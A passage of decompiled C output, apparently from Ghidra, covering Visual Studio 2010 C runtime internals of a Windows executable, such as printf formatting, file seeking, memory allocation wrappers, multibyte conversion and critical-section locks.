                  piVar2 = piVar11;
                  if ((local_214 & 0xc) == 0) {
                    do {
                      if ((int)piVar2 < 1) break;
                      piVar2 = (int *)((int)piVar2 + -1);
                      _write_char(local_25c);
                      bVar8 = extraout_DL_01;
                    } while (local_228 != -1);
                  }
                  pFVar1 = local_25c;
                  _write_string(local_234,bVar8,&local_230);
                  uVar9 = (undefined)extraout_EDX;
                  if (((local_214 & 8) != 0) && (uVar10 = extraout_EDX, (local_214 & 4) == 0)) {
                    do {
                      uVar9 = (undefined)uVar10;
                      if ((int)piVar11 < 1) break;
                      piVar11 = (int *)((int)piVar11 + -1);
                      _write_char(pFVar1);
                      uVar9 = (undefined)extraout_EDX_00;
                      uVar10 = extraout_EDX_00;
                    } while (local_228 != -1);
                  }
                  if ((local_23c == 0) ||
                     (sVar12 = local_224, piVar2 = local_220, (int)local_224 < 1)) {
                    _write_string(local_224,uVar9,local_220);
                  }
                  else {
                    do {
                      sVar12 = sVar12 - 1;
                      eVar5 = _wctomb_s(&local_274,(char *)((int)&local_11 + 1),6,*(wchar_t *)piVar2
                                       );
                      if ((eVar5 != 0) || (local_274 == 0)) {
                        local_228 = -1;
                        break;
                      }
                      _write_string(local_274,extraout_DL_02,(int)&local_11 + 1);
                      piVar2 = (int *)((int)piVar2 + 2);
                    } while (sVar12 != 0);
                  }
                  if ((-1 < local_228) && (piVar2 = local_268, (local_214 & 4) != 0)) {
                    do {
                      if ((int)piVar2 < 1) break;
                      _write_char(pFVar1);
                      piVar2 = (int *)((int)piVar2 + -1);
                    } while (local_228 != -1);
                  }
                }
              }
              else {
                if ('p' < (char)local_215) {
                  if (local_215 == 0x73) {
LAB_0040cae0:
                    piVar2 = local_21c;
                    if (local_21c == (int *)0xffffffff) {
                      piVar2 = (int *)0x7fffffff;
                    }
                    local_22c = (int **)((int)_ArgList + 4);
                    local_220 = *(int **)_ArgList;
                    if ((local_214 & 0x810) == 0) {
                      piVar11 = local_220;
                      if (local_220 == (int *)0x0) {
                        local_220 = (int *)PTR_DAT_00416d24;
                        piVar11 = (int *)PTR_DAT_00416d24;
                      }
                      for (; (piVar2 != (int *)0x0 &&
                             (piVar2 = (int *)((int)piVar2 + -1), *(char *)piVar11 != '\0'));
                          piVar11 = (int *)((int)piVar11 + 1)) {
                      }
                      local_224 = (int)piVar11 - (int)local_220;
                    }
                    else {
                      if (local_220 == (int *)0x0) {
                        local_220 = (int *)PTR_u__null__00416d28;
                      }
                      local_23c = 1;
                      for (piVar11 = local_220;
                          (piVar2 != (int *)0x0 &&
                          (piVar2 = (int *)((int)piVar2 + -1), *(wchar_t *)piVar11 != L'\0'));
                          piVar11 = (int *)((int)piVar11 + 2)) {
                      }
                      local_224 = (int)piVar11 - (int)local_220 >> 1;
                    }
                    goto LAB_0040cfe5;
                  }
                  if (local_215 == 0x75) goto LAB_0040ccb8;
                  if (local_215 != 0x78) goto LAB_0040cfe5;
                  local_264 = 0x27;
LAB_0040ce37:
                  local_224 = 0x10;
                  if ((local_214 & 0x80) != 0) {
                    local_22f = (char)local_264 + 'Q';
                    local_230 = 0x30;
                    local_234 = 2;
                  }
                  goto LAB_0040ccc2;
                }
                if (local_215 == 0x70) {
                  local_21c = (int *)0x8;
LAB_0040ce0b:
                  local_264 = 7;
                  goto LAB_0040ce37;
                }
                if ((char)local_215 < 'e') goto LAB_0040cfe5;
                if ((char)local_215 < 'h') goto LAB_0040ca71;
                if (local_215 == 0x69) goto LAB_0040ccb1;
                if (local_215 != 0x6e) {
                  if (local_215 != 0x6f) goto LAB_0040cfe5;
                  local_224 = 8;
                  if ((local_214 & 0x80) != 0) {
                    local_214 = local_214 | 0x200;
                  }
                  goto LAB_0040ccc2;
                }
                piVar2 = *(int **)_ArgList;
                local_22c = (int **)((int)_ArgList + 4);
                iVar6 = __get_printf_count_output();
                if (iVar6 == 0) goto switchD_0040c7c3_caseD_9;
                if ((local_214 & 0x20) == 0) {
                  *piVar2 = local_228;
                }
                else {
                  *(wchar_t *)piVar2 = (wchar_t)local_228;
                }
                local_260 = 1;
              }
              if (local_258 != (int *)0x0) {
                _free(local_258);
                local_258 = (int *)0x0;
              }
              break;
            default:
              goto switchD_0040c7c3_caseD_9;
            case 0xbad1abe1:
              break;
            }
            local_215 = *local_240;
            _ArgList = (va_list)local_22c;
            _Format = (char *)local_240;
          } while (local_215 != 0);
          if ((local_244 != 0) && (local_244 != 7)) goto switchD_0040c7c3_caseD_9;
        }
        if (local_248 != '\0') {
          *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
        }
        goto LAB_0040d1db;
      }
    }
  }
switchD_0040c7c3_caseD_9:
  piVar2 = __errno();
  *piVar2 = 0x16;
  FUN_004071df();
  if (local_248 != '\0') {
    *(uint *)(local_24c + 0x70) = *(uint *)(local_24c + 0x70) & 0xfffffffd;
  }
LAB_0040d1db:
  iVar6 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar6;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040d20c(void)

{
  _DAT_00418e8c = 0;
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG in_stack_00000008;
  LONG local_8;
  
  local_8 = (LONG)_Offset;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0040d245:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,in_stack_00000008,&local_8,_Offset._4_4_);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_0040d245;
      }
    }
    pbVar1 = (byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int in_stack_ffffffc8;
  undefined8 local_28;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_28 = -1;
        }
        else {
          local_28 = __lseeki64_nolock(_FileHandle,_Offset,in_stack_ffffffc8);
        }
        FUN_0040d379();
        goto LAB_0040d373;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_004071df();
  }
  local_28._0_4_ = 0xffffffff;
  local_28._4_4_ = 0xffffffff;
LAB_0040d373:
  return CONCAT44(local_28._4_4_,(undefined4)local_28);
}



void FUN_0040d379(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2010 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_00417288 = _DAT_00417288 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// Library Function - Single Match
//  __isatty
// 
// Library: Visual Studio 2010 Release

int __cdecl __isatty(int _FileHandle)

{
  int *piVar1;
  
  if (_FileHandle == -2) {
    piVar1 = __errno();
    *piVar1 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00418e90)) {
      return (int)*(char *)((&DAT_00418ea0)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) &
             0x40;
    }
    piVar1 = __errno();
    *piVar1 = 9;
    FUN_004071df();
  }
  return 0;
}



// Library Function - Single Match
//  __fputwc_nolock
// 
// Library: Visual Studio 2010 Release

wint_t __cdecl __fputwc_nolock(wchar_t _Ch,FILE *_File)

{
  int *piVar1;
  wint_t wVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  errno_t eVar6;
  int local_14;
  char local_10 [8];
  uint local_8;
  
  local_8 = DAT_00416048 ^ (uint)&stack0xfffffffc;
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    iVar3 = __fileno(_File);
    if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
      puVar5 = &DAT_00416540;
    }
    else {
      iVar3 = __fileno(_File);
      uVar4 = __fileno(_File);
      puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00418ea0)[iVar3 >> 5]);
    }
    if ((puVar5[0x24] & 0x7f) != 2) {
      iVar3 = __fileno(_File);
      if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
        puVar5 = &DAT_00416540;
      }
      else {
        iVar3 = __fileno(_File);
        uVar4 = __fileno(_File);
        puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00418ea0)[iVar3 >> 5]);
      }
      if ((puVar5[0x24] & 0x7f) != 1) {
        iVar3 = __fileno(_File);
        if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
          puVar5 = &DAT_00416540;
        }
        else {
          iVar3 = __fileno(_File);
          uVar4 = __fileno(_File);
          puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00418ea0)[iVar3 >> 5]);
        }
        if ((puVar5[4] & 0x80) != 0) {
          eVar6 = _wctomb_s(&local_14,local_10,5,_Ch);
          if ((eVar6 == 0) && (iVar3 = 0, 0 < local_14)) {
            do {
              piVar1 = &_File->_cnt;
              *piVar1 = *piVar1 + -1;
              if (*piVar1 < 0) {
                uVar4 = __flsbuf((int)local_10[iVar3],_File);
              }
              else {
                *_File->_ptr = local_10[iVar3];
                uVar4 = (uint)(byte)*_File->_ptr;
                _File->_ptr = _File->_ptr + 1;
              }
            } while ((uVar4 != 0xffffffff) && (iVar3 = iVar3 + 1, iVar3 < local_14));
          }
          goto LAB_0040d59a;
        }
      }
    }
  }
  piVar1 = &_File->_cnt;
  *piVar1 = *piVar1 + -2;
  if (*piVar1 < 0) {
    __flswbuf((uint)(ushort)_Ch,_File);
  }
  else {
    *(wchar_t *)_File->_ptr = _Ch;
    _File->_ptr = _File->_ptr + 2;
  }
LAB_0040d59a:
  wVar2 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return wVar2;
}



// Library Function - Single Match
//  __initp_misc_cfltcvt_tab
// 
// Library: Visual Studio 2010 Release

void __initp_misc_cfltcvt_tab(void)

{
  PVOID pvVar1;
  uint uVar2;
  
  uVar2 = 0;
  do {
    pvVar1 = EncodePointer(*(PVOID *)((int)&PTR_LAB_00416d2c + uVar2));
    *(PVOID *)((int)&PTR_LAB_00416d2c + uVar2) = pvVar1;
    uVar2 = uVar2 + 4;
  } while (uVar2 < 0x28);
  return;
}



// Library Function - Single Match
//  __malloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __malloc_crt(size_t _Size)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = _malloc(_Size);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (DAT_00417b30 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00417b30 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __calloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __calloc_crt(size_t _Count,size_t _Size)

{
  LPVOID pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  while( true ) {
    pvVar1 = __calloc_impl(_Count,_Size,(undefined4 *)0x0);
    if (pvVar1 != (LPVOID)0x0) {
      return pvVar1;
    }
    if (DAT_00417b30 == 0) break;
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00417b30 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
    if (dwMilliseconds == 0xffffffff) {
      return (void *)0x0;
    }
  }
  return (void *)0x0;
}



// Library Function - Single Match
//  __realloc_crt
// 
// Library: Visual Studio 2010 Release

void * __cdecl __realloc_crt(void *_Ptr,size_t _NewSize)

{
  void *pvVar1;
  uint dwMilliseconds;
  
  dwMilliseconds = 0;
  do {
    pvVar1 = _realloc(_Ptr,_NewSize);
    if (pvVar1 != (void *)0x0) {
      return pvVar1;
    }
    if (_NewSize == 0) {
      return (void *)0x0;
    }
    if (DAT_00417b30 == 0) {
      return (void *)0x0;
    }
    Sleep(dwMilliseconds);
    dwMilliseconds = dwMilliseconds + 1000;
    if (DAT_00417b30 < dwMilliseconds) {
      dwMilliseconds = 0xffffffff;
    }
  } while (dwMilliseconds != 0xffffffff);
  return (void *)0x0;
}



// Library Function - Single Match
//  __get_printf_count_output
// 
// Library: Visual Studio 2010 Release

int __cdecl __get_printf_count_output(void)

{
  return (uint)(DAT_00417b34 == (DAT_00416048 | 1));
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_0040d733;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_0040d733:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  __mbtowc_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __mbtowc_l(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes,_locale_t _Locale)

{
  wchar_t *pwVar1;
  int iVar2;
  int *piVar3;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  if ((_SrcCh != (char *)0x0) && (_SrcSizeInBytes != 0)) {
    if (*_SrcCh != '\0') {
      _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
      if ((local_14.locinfo)->lc_category[0].wlocale != (wchar_t *)0x0) {
        iVar2 = __isleadbyte_l((uint)(byte)*_SrcCh,&local_14);
        if (iVar2 == 0) {
          iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,1,_DstCh,
                                      (uint)(_DstCh != (wchar_t *)0x0));
          if (iVar2 != 0) goto LAB_0040d7a9;
        }
        else {
          pwVar1 = (local_14.locinfo)->locale_name[3];
          if ((((1 < (int)pwVar1) && ((int)pwVar1 <= (int)_SrcSizeInBytes)) &&
              (iVar2 = MultiByteToWideChar((local_14.locinfo)->lc_codepage,9,_SrcCh,(int)pwVar1,
                                           _DstCh,(uint)(_DstCh != (wchar_t *)0x0)), iVar2 != 0)) ||
             (((local_14.locinfo)->locale_name[3] <= _SrcSizeInBytes && (_SrcCh[1] != '\0')))) {
            pwVar1 = (local_14.locinfo)->locale_name[3];
            if (local_8 == '\0') {
              return (int)pwVar1;
            }
            *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
            return (int)pwVar1;
          }
        }
        piVar3 = __errno();
        *piVar3 = 0x2a;
        if (local_8 != '\0') {
          *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
        }
        return -1;
      }
      if (_DstCh != (wchar_t *)0x0) {
        *_DstCh = (ushort)(byte)*_SrcCh;
      }
LAB_0040d7a9:
      if (local_8 != '\0') {
        *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
      }
      return 1;
    }
    if (_DstCh != (wchar_t *)0x0) {
      *_DstCh = L'\0';
    }
  }
  return 0;
}



// Library Function - Single Match
//  _mbtowc
// 
// Library: Visual Studio 2010 Release

int __cdecl _mbtowc(wchar_t *_DstCh,char *_SrcCh,size_t _SrcSizeInBytes)

{
  int iVar1;
  
  iVar1 = __mbtowc_l(_DstCh,_SrcCh,_SrcSizeInBytes,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __isleadbyte_l
// 
// Library: Visual Studio 2010 Release

int __cdecl __isleadbyte_l(int _C,_locale_t _Locale)

{
  ushort uVar1;
  int local_14 [2];
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)local_14,_Locale);
  uVar1 = *(ushort *)(*(int *)(local_14[0] + 200) + (_C & 0xffU) * 2);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1 & 0x8000;
}



// Library Function - Single Match
//  _isleadbyte
// 
// Library: Visual Studio 2010 Release

int __cdecl _isleadbyte(int _C)

{
  int iVar1;
  
  iVar1 = __isleadbyte_l(_C,(_locale_t)0x0);
  return iVar1;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_00417b38;
  do {
    if ((&DAT_00416d64)[iVar2 * 2] == 1) {
      (&DAT_00416d60)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = InitializeCriticalSectionAndSpinCount
                        ((LPCRITICAL_SECTION)(&DAT_00416d60)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&DAT_00416d60)[iVar2 * 2] = 0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



// Library Function - Single Match
//  __mtdeletelocks
// 
// Library: Visual Studio 2010 Release

void __cdecl __mtdeletelocks(void)

{
  LPCRITICAL_SECTION lpCriticalSection;
  LPCRITICAL_SECTION *pp_Var1;
  
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00416d60;
  do {
    lpCriticalSection = *pp_Var1;
    if ((lpCriticalSection != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] != (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(lpCriticalSection);
      _free(lpCriticalSection);
      *pp_Var1 = (LPCRITICAL_SECTION)0x0;
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x416e80);
  pp_Var1 = (LPCRITICAL_SECTION *)&DAT_00416d60;
  do {
    if ((*pp_Var1 != (LPCRITICAL_SECTION)0x0) && (pp_Var1[1] == (LPCRITICAL_SECTION)0x1)) {
      DeleteCriticalSection(*pp_Var1);
    }
    pp_Var1 = pp_Var1 + 2;
  } while ((int)pp_Var1 < 0x416e80);
  return;
}



void __cdecl FUN_0040da13(int param_1)

{
  LeaveCriticalSection((LPCRITICAL_SECTION)(&DAT_00416d60)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION lpCriticalSection;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (DAT_00417b04 == 0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    ___crtExitProcess(0xff);
  }
  pp_Var1 = (LPCRITICAL_SECTION *)(&DAT_00416d60 + _LockNum * 2);
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    lpCriticalSection = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = InitializeCriticalSectionAndSpinCount(lpCriticalSection,4000);
        if (BVar3 == 0) {
          _free(lpCriticalSection);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = lpCriticalSection;
        }
      }
      else {
        _free(lpCriticalSection);
      }
      FUN_0040dae3();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_0040dae3(void)

{
  FUN_0040da13(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((LPCRITICAL_SECTION)(&DAT_00416d60)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((LPCRITICAL_SECTION)(&DAT_00416d60)[_File * 2]);
  return;
}



int __cdecl FUN_0040db1f(undefined4 *param_1,LPCWSTR param_2,uint param_3,int param_4,byte param_5)

{
  byte *pbVar1;
  byte bVar2;
  uint *in_EAX;
  errno_t eVar3;
  uint uVar4;
  ulong *puVar5;
  int *piVar6;
  DWORD DVar7;
  long lVar8;
  int iVar9;
  HANDLE pvVar10;
  byte bVar11;
  int unaff_EDI;
  int iVar12;
  bool bVar13;
  longlong lVar14;
  int iVar15;
  _SECURITY_ATTRIBUTES local_38;
  undefined4 local_2c;
  uint local_28;
  HANDLE local_24;
  uint local_20;
  DWORD local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  byte local_7;
  byte local_6;
  byte local_5;
  
  bVar13 = (param_3 & 0x80) == 0;
  local_28 = 0;
  local_6 = 0;
  local_c = 0;
  local_38.nLength = 0xc;
  local_38.lpSecurityDescriptor = (LPVOID)0x0;
  if (bVar13) {
    local_5 = 0;
  }
  else {
    local_5 = 0x10;
  }
  local_38.bInheritHandle = (BOOL)bVar13;
  eVar3 = __get_fmode((int *)&local_28);
  if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if (((param_3 & 0x8000) == 0) && (((param_3 & 0x74000) != 0 || (local_28 != 0x8000)))) {
    local_5 = local_5 | 0x80;
  }
  uVar4 = param_3 & 3;
  if (uVar4 == 0) {
    local_10 = 0x80000000;
  }
  else {
    if (uVar4 == 1) {
      if (((param_3 & 8) == 0) || ((param_3 & 0x70000) == 0)) {
        local_10 = 0x40000000;
        goto LAB_0040dbe1;
      }
    }
    else if (uVar4 != 2) goto LAB_0040dba1;
    local_10 = 0xc0000000;
  }
LAB_0040dbe1:
  if (param_4 == 0x10) {
    local_18 = 0;
  }
  else if (param_4 == 0x20) {
    local_18 = 1;
  }
  else if (param_4 == 0x30) {
    local_18 = 2;
  }
  else if (param_4 == 0x40) {
    local_18 = 3;
  }
  else {
    if (param_4 != 0x80) {
LAB_0040dba1:
      puVar5 = ___doserrno();
      *puVar5 = 0;
      *in_EAX = 0xffffffff;
      piVar6 = __errno();
      *piVar6 = 0x16;
      FUN_004071df();
      return 0x16;
    }
    local_18 = (uint)(local_10 == 0x80000000);
  }
  uVar4 = param_3 & 0x700;
  if (uVar4 < 0x401) {
    if ((uVar4 == 0x400) || (uVar4 == 0)) {
      local_1c = 3;
    }
    else if (uVar4 == 0x100) {
      local_1c = 4;
    }
    else {
      if (uVar4 == 0x200) goto LAB_0040dca3;
      if (uVar4 != 0x300) goto LAB_0040dc83;
      local_1c = 2;
    }
  }
  else {
    if (uVar4 != 0x500) {
      if (uVar4 == 0x600) {
LAB_0040dca3:
        local_1c = 5;
        goto LAB_0040dcb3;
      }
      if (uVar4 != 0x700) {
LAB_0040dc83:
        puVar5 = ___doserrno();
        *puVar5 = 0;
        *in_EAX = 0xffffffff;
        piVar6 = __errno();
        *piVar6 = 0x16;
        FUN_004071df();
        return 0x16;
      }
    }
    local_1c = 1;
  }
LAB_0040dcb3:
  local_14 = 0x80;
  if (((param_3 & 0x100) != 0) && (-1 < (char)(~(byte)DAT_0041728c & param_5))) {
    local_14 = 1;
  }
  if ((param_3 & 0x40) != 0) {
    local_14 = local_14 | 0x4000000;
    local_10 = local_10 | 0x10000;
    local_18 = local_18 | 4;
  }
  if ((param_3 & 0x1000) != 0) {
    local_14 = local_14 | 0x100;
  }
  if ((param_3 & 0x20) == 0) {
    if ((param_3 & 0x10) != 0) {
      local_14 = local_14 | 0x10000000;
    }
  }
  else {
    local_14 = local_14 | 0x8000000;
  }
  uVar4 = __alloc_osfhnd();
  *in_EAX = uVar4;
  if (uVar4 == 0xffffffff) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    *in_EAX = 0xffffffff;
    piVar6 = __errno();
    *piVar6 = 0x18;
    piVar6 = __errno();
    return *piVar6;
  }
  *param_1 = 1;
  local_24 = CreateFileW(param_2,local_10,local_18,&local_38,local_1c,local_14,(HANDLE)0x0);
  if (local_24 == (HANDLE)0xffffffff) {
    if (((local_10 & 0xc0000000) == 0xc0000000) && ((param_3 & 1) != 0)) {
      local_10 = local_10 & 0x7fffffff;
      local_24 = CreateFileW(param_2,local_10,local_18,&local_38,local_1c,local_14,(HANDLE)0x0);
      if (local_24 != (HANDLE)0xffffffff) goto LAB_0040dddb;
    }
    pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    goto LAB_0040ddcc;
  }
LAB_0040dddb:
  DVar7 = GetFileType(local_24);
  if (DVar7 == 0) {
    pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40);
    *pbVar1 = *pbVar1 & 0xfe;
    DVar7 = GetLastError();
    __dosmaperr(DVar7);
    CloseHandle(local_24);
    if (DVar7 == 0) {
      piVar6 = __errno();
      *piVar6 = 0xd;
    }
    goto LAB_0040ddcc;
  }
  if (DVar7 == 2) {
    local_5 = local_5 | 0x40;
  }
  else if (DVar7 == 3) {
    local_5 = local_5 | 8;
  }
  __set_osfhnd(*in_EAX,(intptr_t)local_24);
  bVar11 = local_5 | 1;
  *(byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 4 + (*in_EAX & 0x1f) * 0x40) = bVar11;
  pbVar1 = (byte *)((&DAT_00418ea0)[(int)*in_EAX >> 5] + 0x24 + (*in_EAX & 0x1f) * 0x40);
  *pbVar1 = *pbVar1 & 0x80;
  local_7 = local_5 & 0x48;
  if (local_7 == 0) {
    bVar2 = local_5 & 0x80;
    local_5 = bVar11;
    if (bVar2 == 0) goto LAB_0040e142;
    if ((param_3 & 2) == 0) goto LAB_0040df10;
    lVar8 = __lseek_nolock(*in_EAX,-1,2);
    if (lVar8 == -1) {
      puVar5 = ___doserrno();
      bVar11 = local_5;
      if (*puVar5 == 0x83) goto LAB_0040df10;
    }
    else {
      local_2c = 0;
      iVar12 = __read_nolock(*in_EAX,&local_2c,1);
      if ((((iVar12 != 0) || ((short)local_2c != 0x1a)) ||
          (iVar12 = __chsize_nolock(*in_EAX,CONCAT44(unaff_EDI,lVar8 >> 0x1f)), iVar12 != -1)) &&
         (lVar8 = __lseek_nolock(*in_EAX,0,0), bVar11 = local_5, lVar8 != -1)) goto LAB_0040df10;
    }
LAB_0040dec0:
    __close_nolock(*in_EAX);
    goto LAB_0040ddcc;
  }
LAB_0040df10:
  local_5 = bVar11;
  if ((local_5 & 0x80) != 0) {
    if ((param_3 & 0x74000) == 0) {
      if ((local_28 & 0x74000) == 0) {
        param_3 = param_3 | 0x4000;
      }
      else {
        param_3 = param_3 | local_28 & 0x74000;
      }
    }
    uVar4 = param_3 & 0x74000;
    if (uVar4 == 0x4000) {
      local_6 = 0;
    }
